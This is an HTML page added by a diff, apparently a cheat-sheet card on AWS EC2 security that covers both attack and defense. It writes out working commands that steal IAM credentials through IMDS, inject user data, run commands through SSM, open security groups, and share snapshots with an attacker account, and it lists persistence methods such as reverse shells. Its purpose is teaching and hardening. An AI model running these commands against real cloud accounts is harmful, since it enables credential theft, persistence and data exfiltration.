@@ -1,0 +1,538 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>AWS EC2 Security | AWS Security Cards</title>
+<meta name="description" content="Elastic Compute Cloud (EC2) provides virtual servers with instance metadata service (IMDS) and security groups. IMDS credential theft via SSRF is the #1 EC2 attack vector - the Capital One breach exploited this.">
+<style>
+  *, *::before, *::after { box-sizing: border-box; margin: 0; padding: 0; }
+  body {
+    font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, 'Helvetica Neue', sans-serif;
+    background: #0a0e1a;
+    color: #e2e8f0;
+    line-height: 1.6;
+    padding: 2rem;
+    max-width: 1200px;
+    margin: 0 auto;
+  }
+  a { color: #22d3ee; text-decoration: none; }
+  a:hover { text-decoration: underline; }
+
+  /* Card Image */
+  .card-image {
+    border-radius: 1rem;
+    overflow: hidden;
+    margin-bottom: 2rem;
+    border: 1px solid rgba(255,255,255,0.1);
+  }
+  .card-image img {
+    width: 100%;
+    height: auto;
+    display: block;
+  }
+
+  /* Header */
+  .header {
+    position: relative;
+    overflow: hidden;
+    border-radius: 1rem;
+    background: linear-gradient(135deg, #eab30815, #0a0e1a, #f59e0b15);
+    border: 1px solid #eab3084d;
+    padding: 2.5rem;
+    margin-bottom: 2rem;
+  }
+  .header::before {
+    content: '';
+    position: absolute;
+    top: 0; right: 0;
+    width: 24rem; height: 24rem;
+    background: #eab3080d;
+    border-radius: 50%;
+    filter: blur(3rem);
+  }
+  .header-content { position: relative; display: flex; align-items: flex-start; gap: 1.5rem; }
+  .header-icon { width: 64px; height: 64px; flex-shrink: 0; }
+  .header-icon img { width: 100%; height: 100%; }
+  .header-title { font-size: 1.875rem; font-weight: 700; color: #fff; }
+  .header-badge {
+    display: inline-block;
+    padding: 0.25rem 0.75rem;
+    background: #eab30833;
+    color: #eab308;
+    font-size: 0.8rem;
+    font-weight: 600;
+    border-radius: 999px;
+    border: 1px solid #eab3084d;
+    margin-left: 0.75rem;
+    vertical-align: middle;
+  }
+  .header-desc { color: #94a3b8; max-width: 42rem; margin-top: 0.5rem; }
+
+  /* Stats */
+  .stats-row { display: grid; grid-template-columns: repeat(4, 1fr); gap: 1rem; margin-bottom: 2rem; }
+  .stat-card {
+    background: rgba(255,255,255,0.03);
+    border-radius: 0.5rem;
+    border: 1px solid rgba(255,255,255,0.06);
+    padding: 1rem;
+    text-align: center;
+  }
+  .stat-value { font-size: 1.5rem; font-weight: 700; }
+  .stat-label { font-size: 0.8rem; color: #94a3b8; }
+
+  /* Sections */
+  .section {
+    background: rgba(255,255,255,0.03);
+    border-radius: 0.75rem;
+    border: 1px solid rgba(255,255,255,0.06);
+    padding: 1.5rem;
+    margin-bottom: 1.5rem;
+  }
+  .section h2 {
+    font-size: 1.25rem;
+    font-weight: 700;
+    color: #fff;
+    margin-bottom: 1rem;
+    display: flex;
+    align-items: center;
+    gap: 0.5rem;
+  }
+
+  /* Overview */
+  .overview-grid { display: grid; grid-template-columns: 1fr 1fr; gap: 1.5rem; }
+  .overview-grid h4 { font-size: 0.9rem; font-weight: 600; margin-bottom: 0.5rem; }
+  .overview-grid p { font-size: 0.875rem; color: #94a3b8; margin-bottom: 0.75rem; }
+  .attack-note {
+    background: rgba(0,0,0,0.3);
+    border-radius: 0.5rem;
+    border: 1px solid rgba(255,255,255,0.06);
+    padding: 0.75rem;
+    font-size: 0.875rem;
+    color: #cbd5e1;
+  }
+
+  /* Risk Gauge */
+  .risk-gauge { display: flex; align-items: center; gap: 2rem; }
+  .risk-bar-container { flex: 1; }
+  .risk-bar {
+    height: 1rem;
+    background: #0f172a;
+    border-radius: 999px;
+    overflow: hidden;
+  }
+  .risk-bar-fill {
+    height: 100%;
+    border-radius: 999px;
+    background: linear-gradient(90deg, #eab308, #f97316, #ef4444);
+  }
+  .risk-labels { display: flex; justify-content: space-between; font-size: 0.8rem; color: #94a3b8; margin-top: 0.5rem; }
+  .risk-score { text-align: center; }
+  .risk-score-value { font-size: 2.5rem; font-weight: 700; color: #f87171; }
+  .risk-score-label { font-size: 0.8rem; color: #94a3b8; }
+  .risk-desc { margin-top: 1rem; font-size: 0.875rem; color: #94a3b8; }
+
+  /* Panels Grid */
+  .panels-grid { display: grid; grid-template-columns: repeat(3, 1fr); gap: 1.5rem; margin-bottom: 1.5rem; }
+  @media (max-width: 1024px) { .panels-grid { grid-template-columns: repeat(2, 1fr); } }
+  @media (max-width: 640px) { .panels-grid, .stats-row, .overview-grid { grid-template-columns: 1fr; } }
+  .panel {
+    background: rgba(255,255,255,0.03);
+    border-radius: 0.75rem;
+    border: 1px solid;
+    padding: 1.5rem;
+  }
+  .panel h3 { font-size: 1.1rem; font-weight: 700; margin-bottom: 1rem; display: flex; align-items: center; gap: 0.5rem; }
+  .panel h4 { font-size: 0.85rem; font-weight: 600; margin-bottom: 0.5rem; margin-top: 1rem; }
+  .panel ul { list-style: none; padding: 0; }
+  .panel li {
+    font-size: 0.85rem;
+    color: #cbd5e1;
+    padding: 0.15rem 0;
+    display: flex;
+    align-items: flex-start;
+    gap: 0.5rem;
+  }
+  .bullet { margin-top: 0.15rem; }
+  .note {
+    margin-top: 1rem;
+    padding: 0.75rem;
+    border-radius: 0.5rem;
+    font-size: 0.85rem;
+  }
+
+  /* Commands */
+  .cmd-grid { display: grid; grid-template-columns: 1fr 1fr; gap: 1rem; }
+  .cmd-block { margin-top: 0.75rem; }
+  .cmd-title { font-size: 0.8rem; color: #94a3b8; margin-bottom: 0.25rem; }
+  pre {
+    background: rgba(0,0,0,0.5);
+    border-radius: 0.5rem;
+    padding: 0.75rem;
+    font-size: 0.8rem;
+    color: #4ade80;
+    overflow-x: auto;
+    border: 1px solid rgba(255,255,255,0.06);
+    white-space: pre-wrap;
+    word-break: break-all;
+    font-family: 'SF Mono', 'Fira Code', 'Cascadia Code', monospace;
+  }
+
+  /* Policies */
+  .policy-grid { display: grid; grid-template-columns: 1fr 1fr; gap: 1.5rem; }
+  .policy-card {
+    border-radius: 0.5rem;
+    border: 1px solid;
+    padding: 1rem;
+  }
+  .policy-header { display: flex; align-items: center; gap: 0.5rem; margin-bottom: 0.75rem; font-size: 0.9rem; }
+  .policy-card pre { margin-bottom: 0.75rem; color: #cbd5e1; }
+  .policy-desc { font-size: 0.8rem; color: #94a3b8; }
+
+  /* Defenses */
+  .defense-grid { display: grid; grid-template-columns: 1fr 1fr; gap: 1rem; }
+  .defense-card {
+    background: rgba(255,255,255,0.03);
+    border-radius: 0.5rem;
+    border: 1px solid rgba(255,255,255,0.06);
+    padding: 1rem;
+  }
+  .defense-card:hover { border-color: #22d3ee4d; }
+  .defense-header { display: flex; align-items: flex-start; gap: 0.75rem; }
+  .defense-icon { font-size: 1.5rem; }
+  .defense-card h4 { font-size: 0.9rem; font-weight: 600; color: #fff; margin-bottom: 0.25rem; }
+  .defense-card p { font-size: 0.85rem; color: #94a3b8; margin-bottom: 0.5rem; }
+  .defense-card pre { color: #22d3ee; }
+
+  /* Footer */
+  .footer { text-align: center; padding: 1.5rem 0; font-size: 0.8rem; color: #64748b; }
+  .footer a { color: #22d3ee; }
+
+  /* Prevent ugly page-break splits */
+  .card-image,
+  .header,
+  .stat-card,
+  .stats-row,
+  .section,
+  .panel,
+  .cmd-block,
+  .policy-card,
+  .defense-card,
+  .attack-note,
+  .overview-grid > div,
+  .risk-gauge,
+  .note {
+    break-inside: avoid;
+    page-break-inside: avoid;
+  }
+  .section,
+  .panels-grid,
+  .card-image,
+  .header {
+    break-before: auto;
+    page-break-before: auto;
+  }
+  /* Keep headings with their content */
+  h2, h3, h4 {
+    break-after: avoid;
+    page-break-after: avoid;
+  }
+
+  @media print {
+    body { background: #0a0e1a; -webkit-print-color-adjust: exact; print-color-adjust: exact; }
+    /* Switch panels to 2-col for better page flow */
+    .panels-grid { grid-template-columns: repeat(2, 1fr); }
+    /* Switch commands and policies to single column to avoid splits */
+    .cmd-grid { grid-template-columns: 1fr; }
+    .policy-grid { grid-template-columns: 1fr; }
+    .defense-grid { grid-template-columns: 1fr; }
+  }
+</style>
+</head>
+<body>
+
+<!-- Card Image -->
+<div class="card-image">
+  <img src="../images/ec2-card.webp" alt="AWS EC2 Security" />
+</div>
+
+<!-- Header -->
+<div class="header">
+  <div class="header-content">
+    <div class="header-icon"><img src="../icons/ec2.svg" alt="AWS EC2 Security" /></div>
+    <div>
+      <div>
+        <span class="header-title">AWS EC2 Security</span>
+        <span class="header-badge">COMPUTE</span>
+      </div>
+      <p class="header-desc">Elastic Compute Cloud (EC2) provides virtual servers with instance metadata service (IMDS) and security groups. IMDS credential theft via SSRF is the #1 EC2 attack vector - the Capital One breach exploited this.</p>
+    </div>
+  </div>
+</div>
+
+<!-- Stats -->
+<div class="stats-row">
+        <div class="stat-card">
+          <div class="stat-value" style="color: #f87171;">CRITICAL</div>
+          <div class="stat-label">Risk Level</div>
+        </div>
+        <div class="stat-card">
+          <div class="stat-value" style="color: #4ade80;">Regional</div>
+          <div class="stat-label">AZ-Specific</div>
+        </div>
+        <div class="stat-card">
+          <div class="stat-value" style="color: #60a5fa;">IMDS</div>
+          <div class="stat-label">169.254.169.254</div>
+        </div>
+        <div class="stat-card">
+          <div class="stat-value" style="color: #c084fc;">SGs</div>
+          <div class="stat-label">+ NACLs</div>
+        </div></div>
+
+<!-- Overview -->
+<div class="section"><h2><span style="color:#eab308;">&#x1F4CB;</span> Service Overview</h2><div class="overview-grid">
+        <div>
+          <h4 style="color: #eab308;">Instance Metadata Service (IMDS)</h4>
+          <p>IMDS at 169.254.169.254 provides instance metadata including IAM role credentials. IMDSv1 allows simple GET requests; IMDSv2 requires a session token, blocking most SSRF attacks.</p>
+          <div class="attack-note"><span style="color:#eab308;">Attack note:</span> SSRF to IMDS is the most common cloud credential theft technique</div>
+        </div>
+        <div>
+          <h4 style="color: #eab308;">Security Groups &amp; Access</h4>
+          <p>Security groups act as virtual firewalls controlling inbound and outbound traffic. SSH (22), RDP (3389), and admin ports exposed to 0.0.0.0/0 are critical vulnerabilities.</p>
+          <div class="attack-note"><span style="color:#eab308;">Attack note:</span> Open security groups are constantly scanned by automated botnets</div>
+        </div></div></div>
+
+<!-- Risk Assessment -->
+
+<div class="section">
+  <h2>Security Risk Assessment</h2>
+  <div class="risk-gauge">
+    <div class="risk-bar-container">
+      <div class="risk-bar">
+        <div class="risk-bar-fill" style="width: 90%;"></div>
+      </div>
+      <div class="risk-labels"><span>Low</span><span>Medium</span><span>High</span><span>Critical</span></div>
+    </div>
+    <div class="risk-score">
+      <div class="risk-score-value">9.0</div>
+      <div class="risk-score-label">Risk Score</div>
+    </div>
+  </div>
+  <p class="risk-desc">EC2 instances with IMDSv1 enabled are vulnerable to SSRF-based credential theft. Open security groups and public snapshots containing secrets are also major attack vectors.</p>
+</div>
+
+<!-- Main Panels -->
+<div class="panels-grid">
+      <div class="panel" style="border-color: #f8717133;">
+        <h3 style="color: #f87171;">⚔️ Attack Vectors</h3><h4 style="color: #f87171;">IMDS Exploitation</h4><ul><li><span class="bullet" style="color: #f87171;">&#x2022;</span> SSRF to 169.254.169.254</li><li><span class="bullet" style="color: #f87171;">&#x2022;</span> Steal IAM role credentials</li><li><span class="bullet" style="color: #f87171;">&#x2022;</span> Access user-data scripts</li><li><span class="bullet" style="color: #f87171;">&#x2022;</span> Retrieve SSH public keys</li><li><span class="bullet" style="color: #f87171;">&#x2022;</span> Get instance identity document</li></ul><h4 style="color: #f87171;">Instance Compromise</h4><ul><li><span class="bullet" style="color: #f87171;">&#x2022;</span> Open SSH/RDP to internet</li><li><span class="bullet" style="color: #f87171;">&#x2022;</span> Weak or default credentials</li><li><span class="bullet" style="color: #f87171;">&#x2022;</span> Vulnerable AMI applications</li><li><span class="bullet" style="color: #f87171;">&#x2022;</span> User data with secrets</li><li><span class="bullet" style="color: #f87171;">&#x2022;</span> Unpatched software</li></ul></div>
+      <div class="panel" style="border-color: #fb923c33;">
+        <h3 style="color: #fb923c;">⚠️ Misconfigurations</h3><h4 style="color: #fb923c;">Network Security</h4><ul><li><span class="bullet" style="color: #fb923c;">&#x2022;</span> Security group allows 0.0.0.0/0 ingress</li><li><span class="bullet" style="color: #fb923c;">&#x2022;</span> All ports open in security group</li><li><span class="bullet" style="color: #fb923c;">&#x2022;</span> No egress filtering</li><li><span class="bullet" style="color: #fb923c;">&#x2022;</span> Public IP with sensitive services</li><li><span class="bullet" style="color: #fb923c;">&#x2022;</span> Missing VPC flow logs</li></ul><h4 style="color: #fb923c;">Instance Security</h4><ul><li><span class="bullet" style="color: #fb923c;">&#x2022;</span> IMDSv1 enabled (not v2 required)</li><li><span class="bullet" style="color: #fb923c;">&#x2022;</span> EBS volumes not encrypted</li><li><span class="bullet" style="color: #fb923c;">&#x2022;</span> Public AMIs with secrets</li><li><span class="bullet" style="color: #fb923c;">&#x2022;</span> User data contains credentials</li><li><span class="bullet" style="color: #fb923c;">&#x2022;</span> Over-privileged instance role</li></ul></div>
+      <div class="panel" style="border-color: #22d3ee33;">
+        <h3 style="color: #22d3ee;">🔍 Enumeration</h3>
+        <div class="cmd-block">
+          <div class="cmd-title">List All Instances</div>
+          <pre><code>aws ec2 describe-instances</code></pre>
+        </div>
+        <div class="cmd-block">
+          <div class="cmd-title">List Security Groups</div>
+          <pre><code>aws ec2 describe-security-groups</code></pre>
+        </div>
+        <div class="cmd-block">
+          <div class="cmd-title">Find Public Snapshots</div>
+          <pre><code>aws ec2 describe-snapshots \\
+  --owner-ids self --query 'Snapshots[?Public]'</code></pre>
+        </div>
+        <div class="cmd-block">
+          <div class="cmd-title">Query IMDS (from instance)</div>
+          <pre><code>curl http://169.254.169.254/latest/meta-data/</code></pre>
+        </div>
+        <div class="cmd-block">
+          <div class="cmd-title">Get User Data</div>
+          <pre><code>curl http://169.254.169.254/latest/user-data</code></pre>
+        </div></div>
+      <div class="panel" style="border-color: #c084fc33;">
+        <h3 style="color: #c084fc;">🔑 Credential Theft</h3><h4 style="color: #c084fc;">IMDS Credential Theft</h4><ul><li><span class="bullet" style="color: #c084fc;">&#x2022;</span> Get role name from IMDS</li><li><span class="bullet" style="color: #c084fc;">&#x2022;</span> Retrieve temporary credentials</li><li><span class="bullet" style="color: #c084fc;">&#x2022;</span> Use creds externally</li><li><span class="bullet" style="color: #c084fc;">&#x2022;</span> Credentials valid for hours</li><li><span class="bullet" style="color: #c084fc;">&#x2022;</span> Full role permissions</li></ul><h4 style="color: #c084fc;">Other Credential Sources</h4><ul><li><span class="bullet" style="color: #c084fc;">&#x2022;</span> User data scripts</li><li><span class="bullet" style="color: #c084fc;">&#x2022;</span> Environment variables</li><li><span class="bullet" style="color: #c084fc;">&#x2022;</span> EBS volume contents</li><li><span class="bullet" style="color: #c084fc;">&#x2022;</span> Memory dumps</li><li><span class="bullet" style="color: #c084fc;">&#x2022;</span> Application configs</li></ul><div class="note"><strong>Key insight:</strong> IMDS credentials often have overly broad permissions. Check what the role can access.</div></div>
+      <div class="panel" style="border-color: #facc1533;">
+        <h3 style="color: #facc15;">🔗 Persistence</h3><h4 style="color: #facc15;">Instance-Based</h4><ul><li><span class="bullet" style="color: #facc15;">&#x2022;</span> Add SSH authorized_keys</li><li><span class="bullet" style="color: #facc15;">&#x2022;</span> Create backdoor user</li><li><span class="bullet" style="color: #facc15;">&#x2022;</span> Install reverse shell</li><li><span class="bullet" style="color: #facc15;">&#x2022;</span> Modify startup scripts</li><li><span class="bullet" style="color: #facc15;">&#x2022;</span> SSM agent backdoor</li></ul><h4 style="color: #facc15;">AWS-Based</h4><ul><li><span class="bullet" style="color: #facc15;">&#x2022;</span> Create AMI with backdoor</li><li><span class="bullet" style="color: #facc15;">&#x2022;</span> Modify user data</li><li><span class="bullet" style="color: #facc15;">&#x2022;</span> Create Lambda trigger</li><li><span class="bullet" style="color: #facc15;">&#x2022;</span> Add SSM document</li><li><span class="bullet" style="color: #facc15;">&#x2022;</span> Scheduled SSM commands</li></ul></div>
+      <div class="panel" style="border-color: #4ade8033;">
+        <h3 style="color: #4ade80;">🛡️ Detection</h3><h4 style="color: #4ade80;">CloudTrail Events</h4><ul><li><span class="bullet" style="color: #4ade80;">&#x2022;</span> RunInstances - new instance</li><li><span class="bullet" style="color: #4ade80;">&#x2022;</span> ModifyInstanceMetadataOptions</li><li><span class="bullet" style="color: #4ade80;">&#x2022;</span> CreateImage - AMI creation</li><li><span class="bullet" style="color: #4ade80;">&#x2022;</span> ModifySecurityGroupRules</li><li><span class="bullet" style="color: #4ade80;">&#x2022;</span> CreateSnapshot</li></ul><h4 style="color: #4ade80;">Indicators of Compromise</h4><ul><li><span class="bullet" style="color: #4ade80;">&#x2022;</span> Unusual IMDS access patterns</li><li><span class="bullet" style="color: #4ade80;">&#x2022;</span> GuardDuty UnauthorizedAccess</li><li><span class="bullet" style="color: #4ade80;">&#x2022;</span> VPC flow log anomalies</li><li><span class="bullet" style="color: #4ade80;">&#x2022;</span> Credential use from new IPs</li><li><span class="bullet" style="color: #4ade80;">&#x2022;</span> Security group modifications</li></ul></div></div>
+
+<!-- Exploitation -->
+<div class="section"><h2><span style="color:#f87171;">&#x1F4BB;</span> Exploitation Commands</h2><div class="cmd-grid">
+        <div class="cmd-block">
+          <div class="cmd-title">Steal IAM Role Credentials</div>
+          <pre><code>curl http://169.254.169.254/latest/meta-data/iam/security-credentials/
+# Then: curl http://169.254.169.254/latest/meta-data/iam/security-credentials/&lt;role-name&gt;</code></pre>
+        </div>
+        <div class="cmd-block">
+          <div class="cmd-title">Inject User Data (Stop First)</div>
+          <pre><code>aws ec2 modify-instance-attribute \\
+  --instance-id i-xxx \\
+  --user-data file://payload.sh</code></pre>
+        </div>
+        <div class="cmd-block">
+          <div class="cmd-title">SSM Remote Command Execution</div>
+          <pre><code>aws ssm send-command \\
+  --instance-ids i-xxx \\
+  --document-name AWS-RunShellScript \\
+  --parameters 'commands=[&quot;id&quot;, &quot;cat /etc/passwd&quot;]'</code></pre>
+        </div>
+        <div class="cmd-block">
+          <div class="cmd-title">Open Security Group</div>
+          <pre><code>aws ec2 authorize-security-group-ingress \\
+  --group-id sg-xxx \\
+  --protocol tcp --port 22 --cidr 0.0.0.0/0</code></pre>
+        </div>
+        <div class="cmd-block">
+          <div class="cmd-title">Create Backdoor AMI</div>
+          <pre><code>aws ec2 create-image \\
+  --instance-id i-xxx \\
+  --name &quot;backup-$(date +%s)&quot;</code></pre>
+        </div>
+        <div class="cmd-block">
+          <div class="cmd-title">Copy Snapshot Cross-Account</div>
+          <pre><code>aws ec2 modify-snapshot-attribute \\
+  --snapshot-id snap-xxx \\
+  --attribute createVolumePermission \\
+  --operation-type add --user-ids ATTACKER_ACCOUNT</code></pre>
+        </div></div></div>
+
+<!-- Policies -->
+<div class="section"><h2><span style="color:#4ade80;">&#x1F4DC;</span> Policy Examples</h2><div class="policy-grid">
+        <div class="policy-card" style="border-color: #ef444433; background: rgba(239,68,68,0.05);">
+          <div class="policy-header">
+            <span style="color: #f87171; font-size: 1.2em;">&#x2717;</span>
+            <span style="color: #f87171; font-weight: 600;">Dangerous - Allow All Traffic</span>
+          </div>
+          <pre><code>{
+  &quot;IpPermissions&quot;: [{
+    &quot;IpProtocol&quot;: &quot;-1&quot;,
+    &quot;IpRanges&quot;: [{&quot;CidrIp&quot;: &quot;0.0.0.0/0&quot;}]
+  }]
+}</code></pre>
+          <p class="policy-desc">Allows ALL traffic from ANYWHERE - complete exposure</p>
+        </div>
+        <div class="policy-card" style="border-color: #22c55e33; background: rgba(34,197,94,0.05);">
+          <div class="policy-header">
+            <span style="color: #4ade80; font-size: 1.2em;">&#x2713;</span>
+            <span style="color: #4ade80; font-weight: 600;">Secure - Least Privilege</span>
+          </div>
+          <pre><code>{
+  &quot;IpPermissions&quot;: [{
+    &quot;IpProtocol&quot;: &quot;tcp&quot;,
+    &quot;FromPort&quot;: 443,
+    &quot;ToPort&quot;: 443,
+    &quot;IpRanges&quot;: [{&quot;CidrIp&quot;: &quot;10.0.0.0/8&quot;}]
+  }]
+}</code></pre>
+          <p class="policy-desc">Only HTTPS from internal network - proper restriction</p>
+        </div>
+        <div class="policy-card" style="border-color: #ef444433; background: rgba(239,68,68,0.05);">
+          <div class="policy-header">
+            <span style="color: #f87171; font-size: 1.2em;">&#x2717;</span>
+            <span style="color: #f87171; font-weight: 600;">Dangerous - SSH Open</span>
+          </div>
+          <pre><code>{
+  &quot;IpPermissions&quot;: [{
+    &quot;IpProtocol&quot;: &quot;tcp&quot;,
+    &quot;FromPort&quot;: 22,
+    &quot;ToPort&quot;: 22,
+    &quot;IpRanges&quot;: [{&quot;CidrIp&quot;: &quot;0.0.0.0/0&quot;}]
+  }]
+}</code></pre>
+          <p class="policy-desc">SSH open to internet - brute force target</p>
+        </div>
+        <div class="policy-card" style="border-color: #22c55e33; background: rgba(34,197,94,0.05);">
+          <div class="policy-header">
+            <span style="color: #4ade80; font-size: 1.2em;">&#x2713;</span>
+            <span style="color: #4ade80; font-weight: 600;">Secure - VPC Only</span>
+          </div>
+          <pre><code>{
+  &quot;IpPermissions&quot;: [{
+    &quot;IpProtocol&quot;: &quot;tcp&quot;,
+    &quot;FromPort&quot;: 22,
+    &quot;ToPort&quot;: 22,
+    &quot;UserIdGroupPairs&quot;: [{
+      &quot;GroupId&quot;: &quot;sg-bastion&quot;
+    }]
+  }]
+}</code></pre>
+          <p class="policy-desc">SSH only from bastion security group</p>
+        </div></div></div>
+
+<!-- Defenses -->
+<div class="section"><h2><span style="color:#4ade80;">&#x1F6E1;&#xFE0F;</span> Defense Recommendations</h2><div class="defense-grid">
+        <div class="defense-card">
+          <div class="defense-header">
+            <span class="defense-icon">🔐</span>
+            <div>
+              <h4>Enforce IMDSv2</h4>
+              <p>Require session tokens for IMDS access - blocks most SSRF attacks.</p>
+              <pre><code>aws ec2 modify-instance-metadata-options \\
+  --instance-id i-xxx --http-tokens required</code></pre>
+            </div>
+          </div>
+        </div>
+        <div class="defense-card">
+          <div class="defense-header">
+            <span class="defense-icon">🚫</span>
+            <div>
+              <h4>Restrict Security Groups</h4>
+              <p>No 0.0.0.0/0 ingress rules. Use specific CIDR ranges or security groups.</p>
+              <pre><code>aws ec2 authorize-security-group-ingress \\
+  --cidr 10.0.0.0/8 --port 443</code></pre>
+            </div>
+          </div>
+        </div>
+        <div class="defense-card">
+          <div class="defense-header">
+            <span class="defense-icon">🔒</span>
+            <div>
+              <h4>Encrypt EBS Volumes</h4>
+              <p>Enable default encryption for all new volumes.</p>
+              <pre><code>aws ec2 enable-ebs-encryption-by-default</code></pre>
+            </div>
+          </div>
+        </div>
+        <div class="defense-card">
+          <div class="defense-header">
+            <span class="defense-icon">📝</span>
+            <div>
+              <h4>Use SSM Instead of SSH</h4>
+              <p>No open ports, centralized logging, IAM authentication.</p>
+              <pre><code>aws ssm start-session --target i-xxx</code></pre>
+            </div>
+          </div>
+        </div>
+        <div class="defense-card">
+          <div class="defense-header">
+            <span class="defense-icon">🌐</span>
+            <div>
+              <h4>Enable VPC Flow Logs</h4>
+              <p>Monitor network traffic for anomalies.</p>
+              <pre><code>aws ec2 create-flow-logs \\
+  --resource-type VPC --resource-ids vpc-xxx</code></pre>
+            </div>
+          </div>
+        </div>
+        <div class="defense-card">
+          <div class="defense-header">
+            <span class="defense-icon">🔍</span>
+            <div>
+              <h4>Private Snapshots Only</h4>
+              <p>Never make snapshots public. Use RAM for cross-account sharing.</p>
+              <pre><code>aws ec2 modify-snapshot-attribute \\
+  --snapshot-id snap-xxx --attribute createVolumePermission \\
+  --operation-type remove</code></pre>
+            </div>
+          </div>
+        </div></div></div>
+
+<!-- Footer -->
+<div class="footer">
+  <p>AWS EC2 Security Card</p>
+  <p style="margin-top:0.25rem;">Always obtain proper authorization before testing</p>
+</div>
+
+</body>
+</html>
